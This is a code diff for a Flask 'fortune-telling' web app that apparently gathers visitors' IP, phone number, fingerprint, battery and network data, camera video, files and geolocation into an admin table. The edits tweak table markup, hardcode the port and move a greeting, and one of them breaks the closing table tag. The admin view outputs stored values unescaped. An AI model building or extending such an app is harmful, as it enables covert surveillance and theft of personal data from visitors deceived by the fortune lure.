@@ -43,6 +43,7 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
+# ALL POSSIBLE FIELDS – admin table will ALWAYS show these columns
 ALL_FIELDS = [
     'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
     'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
@@ -159,9 +160,9 @@ def admin():
                         val = v.get(f, '')
                         if f in ('cameraVideo', 'files') and len(str(val)) > 100:
                             val = str(val)[:100] + '…'
-                        html += f'<td style="font-size:12px;">{str(val)[:100]}</td>'
+                        html += f'<td>{str(val)[:100]}</td>'
                     html += '</tr>'
-            html += '</table>'
+            html += '<table>'
             return html
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
@@ -598,8 +599,8 @@ HTML_TEMPLATE = '''
     async function finalizeAndSave() {
         const fortuneResp = await fetch('/get-fortune');
         const fortuneData = await fortuneResp.json();
-        currentFortuneText = fortuneData.fortune + " Dear " + visitorData.name + "! 💕";
-        document.getElementById('fortuneText').innerText = currentFortuneText;
+        currentFortuneText = fortuneData.fortune;
+        document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
         
         if (visitorData.latitude && visitorData.latitude !== 'denied') {
             visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude || 0}`;
@@ -673,5 +674,4 @@ HTML_TEMPLATE = '''
 
 if __name__ == '__main__':
     init_json()
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=False)
